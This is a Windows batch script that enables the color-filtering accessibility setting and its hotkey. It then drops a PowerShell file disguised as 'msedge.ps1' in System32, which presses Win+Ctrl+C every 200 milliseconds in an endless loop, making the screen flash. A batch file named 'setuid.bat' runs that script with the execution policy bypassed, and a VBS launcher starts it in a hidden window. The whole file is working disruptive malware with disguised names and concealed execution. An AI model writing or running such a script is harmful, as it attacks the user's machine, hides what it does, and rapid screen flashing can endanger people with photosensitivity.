@echo off
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "FilterType" /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\ColorFiltering" /v "HotkeyEnabled" /t REG_DWORD /d 1 /f
set PS1File=C:\Windows\System32\msedge.ps1
echo while ($true) {  >> %PS1File%
echo Add-Type -TypeDefinition ' >> %PS1File%
echo using System; >> %PS1File%
echo using System.Runtime.InteropServices; >> %PS1File%
echo public class Keyboard { >> %PS1File%
echo     [DllImport("user32.dll")] >> %PS1File%
echo     public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo); >> %PS1File%
echo }' >> %PS1File%
echo [Keyboard]::keybd_event(0x5B, 0, 0, 0) # Left Windows Key Down >> %PS1File%
echo [Keyboard]::keybd_event(0x11, 0, 0, 0) # Control Key Down >> %PS1File%
echo [Keyboard]::keybd_event(0x43, 0, 0, 0) # 'C' Key Down >> %PS1File%
echo [Keyboard]::keybd_event(0x43, 0, 2, 0) # 'C' Key Up >> %PS1File%
echo [Keyboard]::keybd_event(0x11, 0, 2, 0) # Control Key Up >> %PS1File%
echo [Keyboard]::keybd_event(0x5B, 0, 2, 0) # Left Windows Key Up >> %PS1File%
echo Start-Sleep -Milliseconds 200 >>%PS1File%
echo } >>%PS1File%
echo powershell -ExecutionPolicy Bypass C:\Windows\System32\msedge.ps1 >>C:\Windows\System32\setuid.bat
echo Set WshShell = WScript.CreateObject("WScript.Shell") >>C:\Windows\System32\Deso.vbs
echo WshShell.Run "C:\Windows\System32\setuid.bat", 0 , false >>C:\Windows\System32\Deso.vbs
start C:\Windows\System32\Deso.vbs
